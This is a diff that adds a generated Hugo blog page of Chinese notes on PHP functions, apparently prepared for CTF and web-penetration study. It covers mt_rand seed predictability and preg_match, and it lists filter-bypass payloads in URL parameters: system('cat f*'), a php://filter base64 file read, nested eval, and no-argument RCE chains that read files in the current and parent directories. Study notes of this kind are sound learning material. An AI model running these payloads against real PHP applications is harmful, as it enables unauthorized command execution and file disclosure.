@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>PHP常见方法和函数 | My New Hugo Site</title>
+<meta name="keywords" content="PHP常见方法和函数">
+<meta name="description" content="
+
+md5() 函数是一个哈希函数，它将传入的参数进行哈希处理并返回一个32位的十六进制字符串
+
+
+hexdec() 函数将十六进制字符串转换为对应的十进制数值。
+
+
+mt_rand()函数
+mt_rand() 函数使用 Mersenne Twister 算法生成随机整数。
+使用语法：mt_rand(); or mt_rand(min,max);，生成一个区间内的随机数。
+其参数min默认为最小值0，max默认为可生成的随机数最大值2147483647，由mt_getrandmax()函数获得。
+mt_srand()函数
+mt_srand() 函数播种 Mersenne Twister 随机数生成器。
+提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数。
+当不使用随机数播种函数srand时，php也会自动为随机数播种，因此是否确定种子都不会影响正常运行。
+在php中每一次调用mt_rand()函数，都会检查一下系统有没有播种。（播种为mt_srand()函数完成），当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以同一个种子下，随机数的序列是相同的，这就是漏洞点，两个例子。
+&lt;?PHP 
+mt_srand(0);
+echo mt_rand();
+echo mt_rand();
+echo mt_rand();
+?&gt;
+在上面的代码中，我们把随机数播种为0，每次运行都会获得相同的序列，这就是伪随机：
+963932192
+1273124119
+1535857466
+当我们去掉mt_srand()函数时，再次重复运行实例，系统会自动为rand函数播种，但也是播种一次。因此多次重复运行的结果也相同，为：
+992978829
+928748101
+1380702626
+由于 Mt19937（“梅森旋转算法”）引擎仅接受 32 位整数作为种子，因此尽管 Mt19937 的范围为 219937-1，但可能的随机序列数量仅限于 232（即 4,294,967,296）。
+当依赖隐式或显式随机播种时，重复会出现得更早。根据生日问题，在少于 80,000 个随机生成的种子后，预计重复种子的概率为 50%。在随机生成大约 30,000 个种子后，重复种子的概率为 10%。
+
+
+intval() 函数用于获取变量的整数值。
+
+
+int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )
+搜索 subject 与 pattern 给定的正则表达式的一个匹配。">
+<meta name="author" content="AuranLu">
+<link rel="canonical" href="http://localhost:1313/posts/auran_lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/php%E5%B8%B8%E8%A7%81%E6%96%B9%E6%B3%95%E5%92%8C%E5%87%BD%E6%95%B0/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/auran_lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/php%E5%B8%B8%E8%A7%81%E6%96%B9%E6%B3%95%E5%92%8C%E5%87%BD%E6%95%B0/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="My New Hugo Site (Alt + H)">My New Hugo Site</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      PHP常见方法和函数
+    </h1>
+    <div class="post-meta"><span title='2025-03-10 00:00:00 +0000 UTC'>March 10, 2025</span>&nbsp;·&nbsp;AuranLu
+
+</div>
+  </header> 
+  <div class="post-content"><ul>
+<li>
+<p><code>md5()</code> 函数是一个哈希函数，它将传入的参数进行哈希处理并返回一个32位的十六进制字符串</p>
+</li>
+<li>
+<p><code>hexdec()</code> 函数将十六进制字符串转换为对应的十进制数值。</p>
+</li>
+<li>
+<p><code>mt_rand()</code>函数</p>
+<pre tabindex="0"><code>mt_rand() 函数使用 Mersenne Twister 算法生成随机整数。
+使用语法：mt_rand(); or mt_rand(min,max);，生成一个区间内的随机数。
+其参数min默认为最小值0，max默认为可生成的随机数最大值2147483647，由mt_getrandmax()函数获得。
+</code></pre><p><code>mt_srand()</code>函数</p>
+<pre tabindex="0"><code>mt_srand() 函数播种 Mersenne Twister 随机数生成器。
+提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数。
+当不使用随机数播种函数srand时，php也会自动为随机数播种，因此是否确定种子都不会影响正常运行。
+</code></pre><p>在php中每一次调用mt_rand()函数，都会检查一下系统有没有播种。（播种为mt_srand()函数完成），当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以同一个种子下，随机数的序列是相同的，这就是漏洞点，两个例子。</p>
+<pre tabindex="0"><code>&lt;?PHP 
+mt_srand(0);
+echo mt_rand();
+echo mt_rand();
+echo mt_rand();
+?&gt;
+</code></pre><p>在上面的代码中，我们把随机数播种为0，每次运行都会获得相同的序列，这就是伪随机：</p>
+<pre tabindex="0"><code>963932192
+1273124119
+1535857466
+</code></pre><p>当我们去掉mt_srand()函数时，再次重复运行实例，系统会自动为rand函数播种，但也是播种一次。因此多次重复运行的结果也相同，为：</p>
+<pre tabindex="0"><code>992978829
+928748101
+1380702626
+</code></pre><p>由于 Mt19937（“梅森旋转算法”）引擎仅接受 32 位整数作为种子，因此尽管 Mt19937 的范围为 219937-1，但可能的随机序列数量仅限于 232（即 4,294,967,296）。</p>
+<p>当依赖隐式或显式随机播种时，重复会出现得更早。根据生日问题，在少于 80,000 个随机生成的种子后，预计重复种子的概率为 50%。在随机生成大约 30,000 个种子后，重复种子的概率为 10%。</p>
+</li>
+<li>
+<p><code>intval() </code>函数用于获取变量的整数值。</p>
+</li>
+<li>
+<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )
+</code></pre><p>搜索 subject 与 pattern 给定的正则表达式的一个匹配。</p>
+<ul>
+<li>
+<p>$pattern: 要搜索的模式，字符串形式。</p>
+</li>
+<li>
+<p>$subject: 输入字符串。</p>
+</li>
+<li>
+<p>$matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</p>
+</li>
+<li>
+<p>$flags：flags 可以被设置为以下标记值：</p>
+<ol>
+<li>PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</li>
+</ol>
+</li>
+<li>
+<p>offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。</p>
+</li>
+<li>
+<p>利用方式：构造绕过</p>
+<pre tabindex="0"><code>?c=system(&#39;cat f*&#39;);//glob1
+?c=system(&#39;cat f?ag.php&#39;);//glob2
+?c=system(&#39;cat f\lag.php&#39;);//转义字符实现绕过
+?c=system(&#34;cat f&#39;&#39;lag.php&#34;);
+?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php //直接将题目变成文件包含漏洞
+?c=eval($_GET[1]);&amp;1=system(&#39;cat flag.php&#39;); //马中马嵌套过滤
+</code></pre></li>
+</ul>
+</li>
+<li>
+<p><code>print_r(scandir('.'))</code>：打印当初路径下文件的函数，查看当前目录</p>
+</li>
+<li>
+<p><code>ocaleconv()</code></p>
+</li>
+<li>
+<p>常见无参数rce函数</p>
+<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">scandir() //返回当前目录构成的数组
+localeconv() //一个数组,第一个值为.,很重要
+getcwd() //获取当前工作的目录,无需参数
+dirname() //获取某文件工作的目录
+array_flip() //交换数组的键和值,返回交换后的数组
+array_rand() //随机从数组中取出一个值
+array_reverse() //将数组内容翻转
+strrev() //翻转字符串
+chdir() //改变工作目录
+eval();assert();system() //命令执行
+highlight_file();show_source();readfile() //读文件
+在php程序运行时数组内部会有指针,而通过操控这些指针的指向我们可以控制输出的结果.起始的时候指针指向第一个元素.
+end() //指向最后一个元素并返回
+reset() //指向第一个元素并返回
+next() //指向下一个元素并返回
+prev() //指向上一个元素并返回
+current() //指向当前元素并返回
+</code></pre><p>构造出的函数</p>
+<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">highlight_file(array_rand(array_flip(scandir(getcwd())))); //查看和读取当前目录文件
+print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件
+print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件
+show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件
+show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件
+show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件
+show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位，查看和读取根目录文件
+</code></pre></li>
+<li>
+<p><code>glob()</code>:返回一个包含匹配指定模式的文件名或目录的数组，如果失败则返回 FALSE。glob(&quot;<em>&quot;) 会匹配任意文件，glob(&quot;</em>.php&quot;)则是匹配以php为后缀的文件</p>
+</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/php%E5%B8%B8%E8%A7%81%E6%96%B9%E6%B3%95%E5%92%8C%E5%87%BD%E6%95%B0/">PHP常见方法和函数</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">My New Hugo Site</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
